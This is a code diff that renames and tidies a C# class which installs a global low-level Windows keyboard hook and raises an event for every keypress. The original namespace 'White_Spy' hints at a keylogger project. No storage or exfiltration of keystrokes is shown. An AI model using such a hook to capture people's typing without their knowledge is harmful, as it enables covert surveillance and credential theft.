@@ -1,29 +1,28 @@
 using System;
 using System.Diagnostics;
-using System.Windows.Forms;
 using System.Runtime.InteropServices;
 
 
-namespace White_Spy
+namespace Ulavali
 {
     public class KeyboardHook
     {
-        private const int WH_KEYBOARD_LL = 13;
-        private const int WM_KEYDOWN = 0x0100;
-        private  LowLevelKeyboardProc _proc = HookCallback;
-        private static IntPtr _hookID = IntPtr.Zero;
+        private const int WhKeyboardLl = 13;
+        private const int WmKeydown = 0x0100;
+        private readonly LowLevelKeyboardProc _proc = HookCallback;
+        private static IntPtr _hookId = IntPtr.Zero;
 
         public static event HandelKeyPress OnKeyPress;
 
 
         public  void SetHook()
         {
-            _hookID = SetHook(_proc);
+            _hookId = SetHook(_proc);
         }
 
         public void UnHook()
         {
-            UnhookWindowsHookEx(_hookID);
+            UnhookWindowsHookEx(_hookId);
         }
 
         private  IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -31,7 +30,7 @@ namespace White_Spy
             using (Process curProcess = Process.GetCurrentProcess())
             using (ProcessModule curModule = curProcess.MainModule)
             {
-                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                return SetWindowsHookEx(WhKeyboardLl, proc,
                     GetModuleHandle(curModule.ModuleName), 0);
             }
         }
@@ -42,7 +41,7 @@ namespace White_Spy
         private static IntPtr HookCallback(
             int nCode, IntPtr wParam, IntPtr lParam)
         {
-            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            if (nCode >= 0 && wParam == (IntPtr)WmKeydown)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
 
@@ -50,7 +49,7 @@ namespace White_Spy
 //                Console.WriteLine((Keys)vkCode);
 
             }
-            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+            return CallNextHookEx(_hookId, nCode, wParam, lParam);
         }
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
